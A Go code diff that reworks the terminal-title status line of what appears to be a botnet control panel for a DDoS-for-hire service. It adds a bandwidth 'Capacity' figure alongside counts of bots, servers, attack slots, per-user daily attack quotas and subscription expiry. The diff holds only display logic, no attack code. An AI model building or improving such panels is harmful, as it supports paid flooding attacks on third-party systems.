@@ -17,30 +17,43 @@ func Title() {
 		l7Count := len(workers)
 		workersMux.RUnlock()
 
+		var capacityDisplay string
+		speedtestMutex.RLock()
+		if speedtestCount > 0 {
+			capacityDisplay = fmt.Sprintf(" | Capacity: %.2f Mbps", speedtestTotalMbps)
+		} else {
+			capacityDisplay = " | Capacity: 0.00 Mbps"
+		}
+		speedtestMutex.RUnlock()
+
 		for id, session := range Sessions {
 			sent, err := UserOngoingAttacks(session.User.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
 			if err != nil {
-				// Handle the error
+				// handle error
 			}
 
-			// Calcular días restantes hasta la expiración
 			expiryTime := time.Unix(session.User.Expiry, 0)
 			daysLeft := int(time.Until(expiryTime).Hours() / 24)
 			if daysLeft < 0 {
 				daysLeft = 0
 			}
 
-			// Check if attacks are disabled
+			// Construir título
+			title := fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d",
+				len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions))
+
 			if !Attacks {
-				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: Disabled | Expiry: %d days \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions), daysLeft))); err != nil {
-					delete(Sessions, id)
-					return
-				}
+				title += fmt.Sprintf(" | Attacks: Disabled | Expiry: %d days", daysLeft)
 			} else {
-				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: %d/%d | Expiry: %d days \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions), len(sent), session.User.MaxDaily, daysLeft))); err != nil {
-					delete(Sessions, id)
-					return
-				}
+				title += fmt.Sprintf(" | Attacks: %d/%d | Expiry: %d days", len(sent), session.User.MaxDaily, daysLeft)
+			}
+			// Añadir capacidad
+			title += capacityDisplay
+			title += " \007"
+
+			if _, err := session.Conn.Write([]byte(title)); err != nil {
+				delete(Sessions, id)
+				return
 			}
 		}
 
